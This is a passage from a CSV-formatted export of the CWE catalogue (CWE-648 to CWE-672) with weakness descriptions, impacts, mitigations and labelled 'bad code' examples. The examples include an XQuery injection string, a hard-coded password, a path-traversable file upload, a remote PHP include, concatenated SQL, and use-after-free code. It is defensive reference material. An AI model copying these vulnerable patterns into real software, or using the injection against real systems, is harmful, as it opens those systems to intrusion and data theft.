CWE-648: Incorrect Use of Privileged APIs,The product does not conform to the API requirements for a function call that requires extra privileges. This could allow attackers to gain privileges by causing the function to be called incorrectly.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityAn attacker may be able to elevate privileges., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataAn attacker may be able to obtain sensitive information., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsAn attacker may be able to execute code., Likelihood: ",无示范例子,"Phase:  ImplementationBefore calling privileged APIs, always ensure that the assumptions made by the privileged code hold true prior to making the call.Phase:  Architecture and DesignKnow architecture and implementation weaknesses of the privileged APIs and make sure to account for these weaknesses before calling the privileged APIs to ensure that they can be called safely.Phase:  ImplementationIf privileged APIs make certain assumptions about data, context or state validity that are passed by the caller, the calling code must ensure that these assumptions have been validated prior to making the call.Phase:  ImplementationIf privileged APIs do not shed their privilege prior to returning to the calling code, then calling code needs to shed these privileges immediately and safely right after the call to the privileged APIs. In particular, the calling code needs to ensure that a privileged thread of execution will never be returned to the user or made available to user-controlled processes.Phase:  ImplementationOnly call privileged APIs from safe, consistent and expected state.Phase:  ImplementationEnsure that a failure or an error will not leave a system in a state where privileges are not properly shed and privilege escalation is possible (i.e. fail securely with regards to handling of privileges)."
CWE-649: Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking,"The product uses obfuscation or encryption of inputs that should not be mutable by an external actor, but the product does not use integrity checks to detect if those inputs have been modified.","Scope: Integrity, Impact: Technical Impact:Unexpected StateThe inputs could be modified without detection, causing the product to have unexpected system state or make incorrect security decisions., Likelihood: ",无示范例子,"Phase:  Architecture and DesignProtect important client controllable tokens/parameters for integrity using PKI methods (i.e. digital signatures) or other means, and checks for integrity on the server side.Phase:  Architecture and DesignRepeated requests from a particular user that include invalid values of tokens/parameters (those that should not be changed manually by users) should result in the user account lockout.Phase:  Architecture and DesignClient side tokens/parameters should not be such that it would be easy/predictable to guess another valid state.Phase:  Architecture and DesignObfuscation should not be relied upon. If encryption is used, it needs to be properly applied (i.e. proven algorithm and implementation, use padding, use random initialization vector, user proper encryption mode). Even with proper encryption where the ciphertext does not leak information about the plaintext or reveal its structure, compromising integrity is possible (although less likely) without the provision of the integrity service."
CWE-650: Trusting HTTP Permission Methods on the Server Side,"The server contains a protection mechanism that assumes that any URI that is accessed using HTTP GET will not cause a state change to the associated resource. This might allow attackers to bypass intended access restrictions and conduct resource modification and deletion attacks, since some applications allow GET to modify state.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityAn attacker could escalate privileges., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Application DataAn attacker could modify resources., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataAn attacker could obtain sensitive information., Likelihood: ",无示范例子,Phase:  System ConfigurationConfigure ACLs on the server side to ensure that proper level of access control is defined for each accessible resource representation.
CWE-651: Exposure of WSDL File Containing Sensitive Information,The Web services architecture may require exposing a Web Service Definition Language (WSDL) file that contains information on the publicly accessible services and how callers of these services should interact with them (e.g. what parameters they expect and what types they return).,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataThe attacker may find sensitive information located in the WSDL file., Likelihood: ","Example 1The WSDL for a service providing information on the best price of a certain item exposes the following method: float getBestPrice(String ItemID) An attacker might guess that there is a method setBestPrice (String ItemID, float Price) that is available and invoke that method to try and change the best price of a given item to their advantage. The attack may succeed if the attacker correctly guesses the name of the method, the method does not have proper access controls around it and the service itself has the functionality to update the best price of the item.","Phase:  Architecture and DesignLimit access to the WSDL file as much as possible. If services are provided only to a limited number of entities, it may be better to provide WSDL privately to each of these entities than to publish WSDL publicly.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeMake sure that WSDL does not describe methods that should not be publicly accessible. Make sure to protect service methods that should not be publicly accessible with access controls.Phase:  Architecture and DesignDo not use method names in WSDL that might help an adversary guess names of private methods/resources used by the service."
CWE-652: Improper Neutralization of Data within XQuery Expressions ('XQuery Injection'),"The product uses external input to dynamically construct an XQuery expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataAn attacker might be able to read sensitive information from the XML database., Likelihood: ","Example 1An attacker may pass XQuery expressions embedded in an otherwise standard XML document. The attacker tunnels through the application entry point to target the resource access layer. The string below is an example of an attacker accessing the accounts.xml to request the service provider send all user names back. doc(accounts.xml)//user[name='*'] The attacks that are possible through XQuery are difficult to predict, if the data is not validated prior to executing the XQL.","Phase:  ImplementationUse parameterized queries. This will help ensure separation between data plane and control plane.Phase:  ImplementationProperly validate user input. Reject data where appropriate, filter where appropriate and escape where appropriate. Make sure input that will be used in XQL queries is safe in that context."
CWE-653: Improper Isolation or Compartmentalization,"The product does not properly compartmentalize or isolate functionality, processes, or resources that require different privilege levels, rights, or permissions.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection MechanismThe exploitation of a weakness in low-privileged areas of the software can be leveraged to reach higher-privileged areas without having to overcome any additional obstacles., Likelihood: ","Example 1Single sign-on technology is intended to make it easier for users to access multiple resources or domains without having to authenticate each time. While this is highly convenient for the user and attempts to address problems with psychological acceptability, it also means that a compromise of a user's credentials can provide immediate access to all other resources or domains.Example 2The traditional UNIX privilege model provides root with arbitrary access to all resources, but root is frequently the only user that has privileges. As a result, administrative tasks require root privileges, even if those tasks are limited to a small area, such as updating user manpages. Some UNIX flavors have a ""bin"" user that is the owner of system executables, but since root relies on executables owned by bin, a compromise of the bin account can be leveraged for root privileges by modifying a bin-owned executable, such as CVE-2007-4238.","Phase:  Architecture and DesignBreak up privileges between different modules, objects, or entities. Minimize the interfaces between modules and require strong access control between them."
CWE-654: Reliance on a Single Factor in a Security Decision,"A protection mechanism relies exclusively, or to a large extent, on the evaluation of a single condition or the integrity of a single object or entity in order to make a decision about granting access to restricted resources or functionality.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityIf the single factor is compromised (e.g. by theft or spoofing), then the integrity of the entire security mechanism can be violated with respect to the user that is identified by that factor., Likelihood: ; Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesIt can become difficult or impossible for the product to be able to distinguish between legitimate activities by the entity who provided the factor, versus illegitimate activities by an attacker., Likelihood: ","Example 1Password-only authentication is perhaps the most well-known example of use of a single factor. Anybody who knows a user's password can impersonate that user.Example 2When authenticating, use multiple factors, such as ""something you know"" (such as a password) and ""something you have"" (such as a hardware-based one-time password generator, or a biometric device).","Phase:  Architecture and DesignUse multiple simultaneous checks before granting access to critical operations or granting critical privileges. A weaker but helpful mitigation is to use several successive checks (multiple layers of security).Phase:  Architecture and DesignUse redundant access rules on different choke points (e.g., firewalls)."
CWE-655: Insufficient Psychological Acceptability,"The product has a protection mechanism that is too difficult or inconvenient to use, encouraging non-malicious users to disable or bypass the mechanism, whether by accident or on purpose.","Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismBy bypassing the security mechanism, a user might leave the system in a less secure state than intended by the administrator, making it more susceptible to compromise., Likelihood: ","Example 1In ""Usability of Security: A Case Study"" [REF-540], the authors consider human factors in a cryptography product. Some of the weakness relevant discoveries of this case study were: users accidentally leaked sensitive information, could not figure out how to perform some tasks, thought they were enabling a security option when they were not, and made improper trust decisions.Example 2Enforcing complex and difficult-to-remember passwords that need to be frequently changed for access to trivial resources, e.g., to use a black-and-white printer. Complex password requirements can also cause users to store the passwords in an unsafe manner so they don't have to remember them, such as using a sticky note or saving them in an unencrypted file.Example 3Some CAPTCHA utilities produce images that are too difficult for a human to read, causing user frustration.","Phase:  TestingWhere possible, perform human factors and usability studies to identify where your product's security mechanisms are difficult to use, and why.Phase:  Architecture and DesignMake the security mechanism as seamless as possible, while also providing the user with sufficient details when a security decision produces unexpected results."
CWE-656: Reliance on Security Through Obscurity,"The product uses a protection mechanism whose strength depends heavily on its obscurity, such that knowledge of its algorithms or key data is sufficient to defeat the mechanism.","Scope: ConfidentialityIntegrityAvailabilityOther, Impact: Technical Impact:OtherThe security mechanism can be bypassed easily., Likelihood: ","Example 1The design of TCP relies on the secrecy of Initial Sequence Numbers (ISNs), as originally covered in CVE-1999-0077 [REF-542]. If ISNs can be guessed (due to predictability,CWE-330) or sniffed (due to lack of encryption during transmission,CWE-312), then an attacker can hijack or spoof connections. Many TCP implementations have had variations of this problem over the years, including CVE-2004-0641, CVE-2002-1463, CVE-2001-0751, CVE-2001-0328, CVE-2001-0288, CVE-2001-0163, CVE-2001-0162, CVE-2000-0916, and CVE-2000-0328.Example 1 References:[REF-542] Jon Postel, Editor. ""RFC: 793, TRANSMISSION CONTROL PROTOCOL"". Information Sciences Institute. 1981-09. 
				<https://www.ietf.org/rfc/rfc0793.txt>.URL validated: 2023-04-07.","Phase:  Architecture and DesignAlways consider whether knowledge of your code or design is sufficient to break it. Reverse engineering is a highly successful discipline, and financially feasible for motivated adversaries. Black-box techniques are established for binary analysis of executables that use obfuscation, runtime analysis of proprietary protocols, inferring file formats, and others.Phase:  Architecture and DesignWhen available, use publicly-vetted algorithms and procedures, as these are more likely to undergo more extensive security analysis and testing. This is especially the case with encryption and authentication."
CWE-657: Violation of Secure Design Principles,The product violates well-established principles for secure design.,"Scope: Other, Impact: Technical Impact:Other, Likelihood: ","Example 1Switches may revert their functionality to that of hubs when the table used to map ARP information to the switch interface overflows, such as when under a spoofing attack. This results in traffic being broadcast to an eavesdropper, instead of being sent only on the relevant switch interface. To mitigate this type of problem, the developer could limit the number of ARP entries that can be recorded for a given switch interface, while other interfaces may keep functioning normally. Configuration options can be provided on the appropriate actions to be taken in case of a detected failure, but safe defaults should be used.Example 2The IPSEC specification is complex, which resulted in bugs, partial implementations, and incompatibilities between vendors.Example 3When executable library files are used on web servers, which is common in PHP applications, the developer might perform an access check in any user-facing executable, and omit the access check from the library file itself. By directly requesting the library file (CWE-425), an attacker can bypass this access check.Example 4Single sign-on technology is intended to make it easier for users to access multiple resources or domains without having to authenticate each time. While this is highly convenient for the user and attempts to address problems with psychological acceptability, it also means that a compromise of a user's credentials can provide immediate access to all other resources or domains.Example 5The design of TCP relies on the secrecy of Initial Sequence Numbers (ISNs), as originally covered in CVE-1999-0077 [REF-542]. If ISNs can be guessed (due to predictability,CWE-330) or sniffed (due to lack of encryption during transmission,CWE-312), then an attacker can hijack or spoof connections. Many TCP implementations have had variations of this problem over the years, including CVE-2004-0641, CVE-2002-1463, CVE-2001-0751, CVE-2001-0328, CVE-2001-0288, CVE-2001-0163, CVE-2001-0162, CVE-2000-0916, and CVE-2000-0328.Example 5 References:[REF-542] Jon Postel, Editor. ""RFC: 793, TRANSMISSION CONTROL PROTOCOL"". Information Sciences Institute. 1981-09. 
				<https://www.ietf.org/rfc/rfc0793.txt>.URL validated: 2023-04-07.Example 6The ""SweynTooth"" vulnerabilities in Bluetooth Low Energy (BLE) software development kits (SDK) were found to affect multiple Bluetooth System-on-Chip (SoC) manufacturers. These SoCs were used by many products such as medical devices, Smart Home devices, wearables, and other IoT devices. [REF-1314] [REF-1315]",无可能的缓解方案
CWE VIEW: Weaknesses in Software Written in C,This view (slice) covers issues that are found in C programs that are not common to all languages.,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses in Software Written in C++,This view (slice) covers issues that are found in C++ programs that are not common to all languages.,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses in Software Written in Java,This view (slice) covers issues that are found in Java programs that are not common to all languages.,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses in Software Written in PHP,This view (slice) covers issues that are found in PHP programs that are not common to all languages.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-662: Improper Synchronization,"The product utilizes multiple threads or processes to allow temporary access to a shared resource that can only be exclusive to one process at a time, but it does not properly synchronize these actions, which might cause simultaneous accesses of this resource by multiple threads or processes.","Scope: IntegrityConfidentialityOther, Impact: Technical Impact:Modify Application Data; Read Application Data; Alter Execution Logic, Likelihood: ","Example 1The following function attempts to acquire a lock in order to perform operations on a shared resource.(bad code)Example Language:Cvoid f(pthread_mutex_t *mutex) {pthread_mutex_lock(mutex);/* access shared resource */pthread_mutex_unlock(mutex);}However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior.In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels.(good code)Example Language:Cint f(pthread_mutex_t *mutex) {int result;result = pthread_mutex_lock(mutex);if (0 != result)return result;/* access shared resource */return pthread_mutex_unlock(mutex);}Example 2The following code intends to fork a process, then have both the parent and child processes print a single line.(bad code)Example Language:Cstatic void print (char * string) {char * word;int counter;for (word = string; counter = *word++; ) {putc(counter, stdout);fflush(stdout);/* Make timing window a little larger... */sleep(1);}}int main(void) {pid_t pid;pid = fork();if (pid == -1) {exit(-2);}else if (pid == 0) {print(""child\n"");}else {print(""PARENT\n"");}exit(0);}One might expect the code to print out something like:PARENTchildHowever, because the parent and child are executing concurrently, and stdout is flushed each time a character is printed, the output might be mixed together, such as:PcAhRiElNdT[blank line][blank line]",Phase:  ImplementationUse industry standard APIs to synchronize your code.
CWE-663: Use of a Non-reentrant Function in a Concurrent Context,The product calls a non-reentrant function in a concurrent context in which a competing code sequence (e.g. thread or signal handler) may have an opportunity to call the same function or otherwise influence its state.,"Scope: IntegrityConfidentialityOther, Impact: Technical Impact:Modify Memory; Read Memory; Modify Application Data; Read Application Data; Alter Execution Logic, Likelihood: ","Example 1In this example, a signal handler uses syslog() to log a message:(bad code)char *message;void sh(int dummy) {syslog(LOG_NOTICE,""%s\n"",message);sleep(10);exit(0);}int main(int argc,char* argv[]) {...signal(SIGHUP,sh);signal(SIGTERM,sh);sleep(10);exit(0);}If the execution of the first call to the signal handler is suspended after invoking syslog(), and the signal handler is called a second time, the memory allocated by syslog() enters an undefined, and possibly, exploitable state.Example 2The following code relies on getlogin() to determine whether or not a user is trusted. It is easily subverted.(bad code)Example Language:Cpwd = getpwnam(getlogin());if (isTrustedGroup(pwd->pw_gid)) {allow();} else {deny();}","Phase:  ImplementationUse reentrant functions if available.Phase:  ImplementationAdd synchronization to your non-reentrant function.Phase:  ImplementationIn Java, use the ReentrantLock Class."
CWE-664: Improper Control of a Resource Through its Lifetime,"The product does not maintain or incorrectly maintains control over a resource throughout its lifetime of creation, use, and release.","Scope: Other, Impact: Technical Impact:Other, Likelihood: ",无示范例子,Phase:  TestingUse Static analysis tools to check for unreleased resources.
CWE-665: Improper Initialization,"The product does not initialize or incorrectly initializes a resource, which might leave the resource in an unexpected state when it is accessed or used.","Scope: Confidentiality, Impact: Technical Impact:Read Memory; Read Application DataWhen reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIf security-critical decisions rely on a variable having a ""0"" or equivalent value, and the programming language performs this initialization on behalf of the programmer, then a bypass of security may occur., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartThe uninitialized data may contain values that cause program flow to change in ways that the programmer did not intend. For example, if an uninitialized variable is used as an array index in C, then its previous contents may produce an index that is outside the range of the array, possibly causing a crash or an exit in other environments., Likelihood:","Example 1Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached.(bad code)Example Language:Javaprivate boolean initialized = true;public void someMethod() {if (!initialized) {// perform initialization tasks...initialized = true;}Example 2The following code intends to limit certain operations to the administrator only.(bad code)Example Language:Perl$username = GetCurrentUser();$state = GetStateData($username);if (defined($state)) {$uid = ExtractUserID($state);}# do stuffif ($uid == 0) {DoAdminThings();}If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to ""0"" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident.Example 3The following code intends to concatenate a string to a variable and print the string.(bad code)Example Language:Cchar str[20];strcat(str, ""hello world"");printf(""%s"", str);This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory.If a null terminator is found before str[8], then some bytes of random garbage will be printed before the ""hello world"" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result ofCWE-14orCWE-244). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found.If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (CWE-126) if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash.","Phase:  RequirementsStrategy:  Language SelectionUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, in Java, if the programmer does not explicitly initialize a variable, then the code could produce a compile-time error (if the variable is local) or automatically initialize the variable to the default value for the variable's type. In Perl, if explicit initialization is not performed, then a default value of undef is assigned, which is interpreted as 0, false, or an equivalent value depending on the context in which the variable is accessed.Phase:  Architecture and DesignIdentify all variables and data stores that receive information from external sources, and apply input validation to make sure that they are only initialized to expected values.Phase:  ImplementationExplicitly initialize all your variables and other data stores, either during declaration or just before the first usage.Phase:  ImplementationPay close attention to complex conditionals that affect initialization, since some conditions might not perform the initialization.Phase:  ImplementationAvoid race conditions (CWE-362) during initialization routines.Phase:  Build and CompilationRun or compile your product with settings that generate warnings about uninitialized variables or data.Phase:  TestingUse automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."
CWE-666: Operation on Resource in Wrong Phase of Lifetime,"The product performs an operation on a resource at the wrong phase of the resource's lifecycle, which can lead to unexpected behaviors.","Scope: Other, Impact: Technical Impact:Other, Likelihood: ","Example 1The following code shows a simple example of a double free vulnerability.(bad code)Example Language:Cchar* ptr = (char*)malloc (SIZE);...if (abrt) {free(ptr);}...free(ptr);Double free vulnerabilities have two common (and sometimes overlapping) causes:Error conditions and other exceptional circumstancesConfusion over which part of the program is responsible for freeing the memoryAlthough some double free vulnerabilities are not much more complicated than this example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once.",Phase:  Architecture and DesignFollow the resource's lifecycle from creation to release.
CWE-667: Improper Locking,"The product does not properly acquire or release a lock on a resource, leading to unexpected resource state changes and behaviors.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU)Inconsistent locking discipline can lead to deadlock., Likelihood: ","Example 1In the following Java snippet, methods are defined to get and set a long field in an instance of a class that is shared across multiple threads. Because operations on double and long are nonatomic in Java, concurrent access may cause unexpected behavior. Thus, all operations on long and double fields should be synchronized.(bad code)Example Language:Javaprivate long someLongValue;public long getLongValue() {return someLongValue;}public void setLongValue(long l) {someLongValue = l;}Example 2This code tries to obtain a lock for a file, then writes to it.(bad code)Example Language:PHPfunction writeToLog($message){$logfile = fopen(""logFile.log"", ""a"");//attempt to get logfile lockif (flock($logfile, LOCK_EX)) {fwrite($logfile,$message);// unlock logfileflock($logfile, LOCK_UN);}else {print ""Could not obtain lock on logFile.log, message not recorded\n"";}}fclose($logFile);PHP by default will wait indefinitely until a file lock is released. If an attacker is able to obtain the file lock, this code will pause execution, possibly leading to denial of service for other users. Note that in this case, if an attacker can perform an flock() on the file, they may already have privileges to destroy the log file. However, this still impacts the execution of other programs that depend on flock().Example 3The following function attempts to acquire a lock in order to perform operations on a shared resource.(bad code)Example Language:Cvoid f(pthread_mutex_t *mutex) {pthread_mutex_lock(mutex);/* access shared resource */pthread_mutex_unlock(mutex);}However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior.In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels.(good code)Example Language:Cint f(pthread_mutex_t *mutex) {int result;result = pthread_mutex_lock(mutex);if (0 != result)return result;/* access shared resource */return pthread_mutex_unlock(mutex);}Example 4It may seem that the following bit of code achieves thread safety while avoiding unnecessary synchronization...(bad code)Example Language:Javaif (helper == null) {synchronized (this) {if (helper == null) {helper = new Helper();}}}return helper;The programmer wants to guarantee that only one Helper() object is ever allocated, but does not want to pay the cost of synchronization every time this code is called.Suppose that helper is not initialized. Then, thread A sees that helper==null and enters the synchronized block and begins to execute:(bad code)helper = new Helper();If a second thread, thread B, takes over in the middle of this call and helper has not finished running the constructor, then thread B may make calls on helper while its fields hold incorrect values.",Phase:  ImplementationStrategy:  Libraries or FrameworksUse industry standard APIs to implement locking mechanism.
CWE-668: Exposure of Resource to Wrong Sphere,"The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource.","Scope: ConfidentialityIntegrityOther, Impact: Technical Impact:Read Application Data; Modify Application Data; Other, Likelihood: ",无示范例子,无可能的缓解方案
CWE-669: Incorrect Resource Transfer Between Spheres,"The product does not properly transfer a resource/behavior to another sphere, or improperly imports a resource/behavior from another sphere, in a manner that provides unintended control over that resource.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data; Unexpected State, Likelihood: ","Example 1The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet.(good code)Example Language:HTML<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">Choose a file to upload:<input type=""file"" name=""filename""/><br/><input type=""submit"" name=""submit"" value=""Submit""/></form>When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.(bad code)Example Language:Javapublic class FileUploadServlet extends HttpServlet {...protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {response.setContentType(""text/html"");PrintWriter out = response.getWriter();String contentType = request.getContentType();// the starting position of the boundary headerint ind = contentType.indexOf(""boundary="");String boundary = contentType.substring(ind+9);String pLine = new String();String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value// verify that content type is multipart form dataif (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {// extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));...pLine = br.readLine();String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));...// output the file to the local upload directorytry {BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));for (String line; (line=br.readLine())!=null; ) {if (line.indexOf(boundary) == -1) {bw.write(line);bw.newLine();bw.flush();}} //end of for loopbw.close();} catch (IOException ex) {...}// output successful upload response HTML page}// output unsuccessful upload response HTML pageelse{...}}...}This code does not perform a check on the type of the file being uploaded (CWE-434). This could allow an attacker to upload any executable file or other file with malicious code.Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-23). Since the code does not check the filename that is provided in the header, an attacker can use ""../"" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.Example 2This code includes an external script to get database credentials, then authenticates a user against the database, allowing access to the application.(bad code)Example Language:PHP//assume the password is already encrypted, avoidingCWE-312function authenticate($username,$password){include(""http://external.example.com/dbInfo.php"");//dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname availablemysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');mysql_select_db($dbname);$query = 'Select * from users where username='.$username.' And password='.$password;$result = mysql_query($query);if(mysql_numrows($result) == 1){mysql_close();return true;}else{mysql_close();return false;}}This code does not verify that the external domain accessed is the intended one. An attacker may somehow cause the external domain name to resolve to an attack server, which would provide the information for a false database. The attacker may then steal the usernames and encrypted passwords from real user login attempts, or simply allow themself to access the application without a real user account.This example is also vulnerable to an Adversary-in-the-Middle AITM (CWE-300) attack.Example 3This code either generates a public HTML user information page or a JSON response containing the same user information.(bad code)Example Language:PHP// API flag, output JSON if set$json = $_GET['json']$username = $_GET['user']if(!$json){$record = getUserRecord($username);foreach($record as $fieldName => $fieldValue){if($fieldName == ""email_address"") {// skip displaying user emailscontinue;}else{writeToHtmlPage($fieldName,$fieldValue);}}}else{$record = getUserRecord($username);echo json_encode($record);}The programmer is careful to not display the user's e-mail address when displaying the public HTML page. However, the e-mail address is not removed from the JSON response, exposing the user's e-mail address.",无可能的缓解方案
CWE-670: Always-Incorrect Control Flow Implementation,"The code contains a control flow path that does not reflect the algorithm that the path is intended to implement, leading to incorrect behavior any time this path is navigated.","Scope: Other, Impact: Technical Impact:Other; Alter Execution Logic, Likelihood: ","Example 1This code queries a server and displays its status when a request comes from an authorized IP address.(bad code)Example Language:PHP$requestingIP = $_SERVER['REMOTE_ADDR'];if(!in_array($requestingIP,$ipAllowList)){echo ""You are not authorized to view this page"";http_redirect($errorPageURL);}$status = getServerStatus();echo $status;...This code redirects unauthorized users, but continues to execute code after calling http_redirect(). This means even unauthorized users may be able to access the contents of the page or perform a DoS attack on the server being queried. Also, note that this code is vulnerable to an IP address spoofing attack (CWE-212).Example 2In this example, the programmer has indented the statements to call Do_X() and Do_Y(), as if the intention is that these functions are only called when the condition is true. However, because there are no braces to signify the block, Do_Y() will always be executed, even if the condition is false.(bad code)Example Language:Cif (condition==true)Do_X();Do_Y();This might not be what the programmer intended. When the condition is critical for security, such as in making a security decision or detecting a critical error, this may produce a vulnerability.Example 3In both of these examples, a message is printed based on the month passed into the function:(bad code)Example Language:Javapublic void printMessage(int month){switch (month) {case 1: print(""January"");case 2: print(""February"");case 3: print(""March"");case 4: print(""April"");case 5: print(""May"");case 6: print(""June"");case 7: print(""July"");case 8: print(""August"");case 9: print(""September"");case 10: print(""October"");case 11: print(""November"");case 12: print(""December"");}println("" is a great month"");}(bad code)Example Language:Cvoid printMessage(int month){switch (month) {case 1: printf(""January"");case 2: printf(""February"");case 3: printf(""March"");case 4: printf(""April"");case 5: printff(""May"");case 6: printf(""June"");case 7: printf(""July"");case 8: printf(""August"");case 9: printf(""September"");case 10: printf(""October"");case 11: printf(""November"");case 12: printf(""December"");}printf("" is a great month"");}Both examples do not use a break statement after each case, which leads to unintended fall-through behavior. For example, calling ""printMessage(10)"" will result in the text ""OctoberNovemberDecember is a great month"" being printed.Example 4In the excerpt below, an AssertionError (an unchecked exception) is thrown if the user hasn't entered an email address in an HTML form.(bad code)Example Language:JavaString email = request.getParameter(""email_address"");assert email != null;",无可能的缓解方案
CWE-671: Lack of Administrator Control over Security,The product uses security features in a way that prevents the product's administrator from tailoring security settings to reflect the environment in which the product is being used. This introduces resultant weaknesses or prevents it from operating at a level of security that is desired by the administrator.,"Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1The following code is an example of an internal hard-coded password in the back-end:(bad code)Example Language:Cint VerifyAdmin(char *password) {if (strcmp(password, ""Mew!"")) {printf(""Incorrect Password!\n"");return(0)}printf(""Entering Diagnostic Mode...\n"");return(1);}(bad code)Example Language:Javaint VerifyAdmin(String password) {if (!password.equals(""Mew!"")) {return(0)}//Diagnostic Modereturn(1);}Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this ""functionality.""",无可能的缓解方案
CWE-672: Operation on a Resource after Expiration or Release,"The product uses, accesses, or otherwise operates on a resource after that resource has been expired, released, or revoked.","Scope: IntegrityConfidentiality, Impact: Technical Impact:Modify Application Data; Read Application DataIf a released resource is subsequently reused or reallocated, then an attempt to use the original resource might allow access to sensitive data that is associated with a different user or entity., Likelihood: ; Scope: OtherAvailability, Impact: Technical Impact:Other; DoS: Crash, Exit, or RestartWhen a resource is released it might not be in an expected state, later attempts to access the resource may lead to resultant errors that may lead to a crash., Likelihood: ","Example 1The following code shows a simple example of a use after free error:(bad code)Example Language:Cchar* ptr = (char*)malloc (SIZE);if (err) {abrt = 1;free(ptr);}...if (abrt) {logError(""operation aborted before commit"", ptr);}When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the logError function.Example 2The following code shows a simple example of a double free error:(bad code)Example Language:Cchar* ptr = (char*)malloc (SIZE);...if (abrt) {free(ptr);}...free(ptr);Double free vulnerabilities have two common (and sometimes overlapping) causes:Error conditions and other exceptional circumstancesConfusion over which part of the program is responsible for freeing the memoryAlthough some double free vulnerabilities are not much more complicated than the previous example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once.Example 3In the following C/C++ example the method processMessage is used to process a message received in the input array of char arrays. The input message array contains two char arrays: the first is the length of the message and the second is the body of the message. The length of the message is retrieved and used to allocate enough memory for a local char array, messageBody, to be created for the message body. The messageBody is processed in the method processMessageBody that will return an error if an error occurs while processing. If an error occurs then the return result variable is set to indicate an error and the messageBody char array memory is released using the method free and an error message is sent to the logError method.(bad code)Example Language:C#define FAIL 0#define SUCCESS 1#define ERROR -1#define MAX_MESSAGE_SIZE 32int processMessage(char **message){int result = SUCCESS;int length = getMessageLength(message[0]);char *messageBody;if ((length > 0) && (length < MAX_MESSAGE_SIZE)) {messageBody = (char*)malloc(length*sizeof(char));messageBody = &message[1][0];int success = processMessageBody(messageBody);if (success == ERROR) {result = ERROR;free(messageBody);}}else {printf(""Unable to process message; invalid message length"");result = FAIL;}if (result == ERROR) {logError(""Error processing message"", messageBody);}return result;}However, the call to the method logError includes the messageBody after the memory for messageBody has been released using the free method. This can cause unexpected results and may lead to system crashes. A variable should never be used after its memory resources have been released.(good code)Example Language:C...messageBody = (char*)malloc(length*sizeof(char));messageBody = 